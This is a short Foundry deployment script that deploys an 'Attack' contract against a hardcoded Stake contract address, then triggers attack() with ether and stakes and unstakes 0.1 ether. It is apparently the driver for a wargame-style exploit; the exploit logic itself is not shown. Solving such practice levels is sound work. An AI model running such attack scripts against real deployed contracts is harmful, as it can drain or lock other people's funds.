// filepath: script/DeployAttack.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/stake.sol";
import "forge-std/console.sol";


contract Deploy is Script {
    function run() external {
        vm.startBroadcast();
        new Attack(0xCd8AF4A0F29cF7966C051542905F66F5dca9052f);
        vm.stopBroadcast();
    }
}

contract CallFunction is Script {
    function run() external {
        vm.startBroadcast();
        Attack attackcontract = Attack(payable(address(0x1375A6ce85EDb45fC8E65a4Db5C78afB3916Bc5c)));
        attackcontract.attack{value: 0.11 ether}();
        Stake stake= Stake(0xFC0183eb5B64Abd0aA903e20BA2305A863FcFC5F);
        stake.StakeETH{value: 0.1 ether}();
        stake.Unstake(0.1 ether);
        vm.stopBroadcast();
    }
}